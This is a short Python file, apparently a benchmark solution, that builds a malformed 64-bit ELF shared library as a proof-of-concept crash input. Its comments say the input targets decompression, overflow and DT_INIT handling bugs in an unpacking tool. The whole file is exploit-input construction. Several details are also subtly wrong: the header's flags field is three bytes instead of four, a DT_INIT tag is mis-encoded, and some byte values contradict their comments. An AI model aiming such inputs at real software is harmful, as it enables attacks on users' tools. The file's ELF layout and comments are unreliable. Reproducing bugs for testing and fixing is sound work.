class Solution:
    def solve(self, src_path: str) -> bytes:
        # Minimal malformed 64-bit ELF shared library header to potentially trigger decompression issues
        elf_magic = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        elf_type = b'\x03\x00'  # ET_DYN
        elf_machine = b'\x3e\x00'  # EM_X86_64
        elf_version = b'\x01\x00\x00\x00'
        elf_entry = b'\x00\x00\x00\x00\x00\x00\x00\x00'
        elf_phoff = b'\x40\x00\x00\x00\x00\x00\x00\x00'  # Program headers at 64
        elf_shoff = b'\x00\x00\x00\x00\x00\x00\x00\x00'  # No section headers
        elf_flags = b'\x00\x00\x00'
        elf_ehsize = b'\x40\x00'
        elf_phentsize = b'\x38\x00'  # 56 bytes per PH
        elf_phnum = b'\x04\x00'  # 4 program headers to potentially trigger loop issues
        elf_shentsize = b'\x00\x00'
        elf_shnum = b'\x00\x00'
        elf_shstrndx = b'\x00\x00'
        header = elf_magic + elf_type + elf_machine + elf_version + elf_entry + elf_phoff + elf_shoff + elf_flags + elf_ehsize + elf_phentsize + elf_phnum + elf_shentsize + elf_shnum + elf_shstrndx

        # Program headers: Multiple PT_LOAD with potentially invalid/large sizes and offsets to trigger buffer issues
        # PH1: PT_LOAD, r-x, offset=0, vaddr=0x400000, filesz=0x1000 (small), memsz=0x1000
        ph1 = b'\x01\x00\x00\x00' + b'\x05\x00\x00\x00' + b'\x00\x00\x00\x00' + b'\x00\x00\x00\x00\x00\x10\x00\x00' + b'\x00\x00\x00\x00\x00\x10\x00\x00' + b'\x00\x10\x00\x00\x00\x00\x00\x00' + b'\x00\x10\x00\x00\x00\x00\x00\x00' + b'\x00\x10\x00\x00\x00\x00\x00\x00'
        # PH2: PT_LOAD, rw-, offset=0x1000, vaddr=0x401000, filesz=0x100000 (large to cause potential overflow), memsz=0x100000
        ph2 = b'\x01\x00\x00\x00' + b'\x06\x00\x00\x00' + b'\x00\x10\x00\x00\x00\x00\x00\x00' + b'\x00\x10\x00\x00\x00\x10\x00\x00' + b'\x00\x10\x00\x00\x00\x10\x00\x00' + b'\x00\x00\x01\x00\x00\x00\x00\x00' + b'\x00\x00\x01\x00\x00\x00\x00\x00' + b'\x00\x10\x00\x00\x00\x00\x00\x00'
        # PH3: PT_DYNAMIC, to trigger DT_INIT issues, offset=0, vaddr=0x402000, filesz=0x100, memsz=0x100
        ph3 = b'\x02\x00\x00\x00' + b'\x06\x00\x00\x00' + b'\x00\x00\x00\x00\x00\x00\x00\x00' + b'\x00\x20\x00\x00\x00\x10\x00\x00' + b'\x00\x20\x00\x00\x00\x10\x00\x00' + b'\x00\x01\x00\x00\x00\x00\x00\x00' + b'\x00\x01\x00\x00\x00\x00\x00\x00' + b'\x08\x00\x00\x00\x00\x00\x00\x00'
        # PH4: Another PT_LOAD with invalid method-like flags or large align to trigger unsafe lowmem usage
        ph4 = b'\x01\x00\x00\x00' + b'\x07\x00\x00\x00' + b'\xff\xff\xff\xff\xff\xff\xff\xff' + b'\xff\xff\xff\xff\xff\xff\xff\xff' + b'\xff\xff\xff\xff\xff\xff\xff\xff' + b'\xff\xff\xff\xff\xff\xff\xff\xff' + b'\xff\xff\xff\xff\xff\xff\xff\xff' + b'\x00\x00\x00\x00\x00\x00\x00\x01'  # Invalid offsets/sizes

        phs = ph1 + ph2 + ph3 + ph4  # 4 * 56 = 224 bytes

        # Remaining data: some dynamic tags for DT_INIT, malformed to trigger un_DT_INIT issues
        dynamic_start = b'\x00\x00\x00\x00'  # DT_NULL
        dynamic_start += b'\x00\x00\x00\x13' + b'\x20\x40\x00\x00\x00\x00\x00\x00'  # DT_INIT at 0x400020 (invalid)
        dynamic_start += b'\x00\x00\x00\x00' * 10  # More nulls

        # Pad to 512 bytes total
        remaining = 512 - len(header + phs + dynamic_start)
        filler = b'\x41' * remaining  # 'A' pattern for easy crash analysis

        poc = header + phs + dynamic_start + filler
        return poc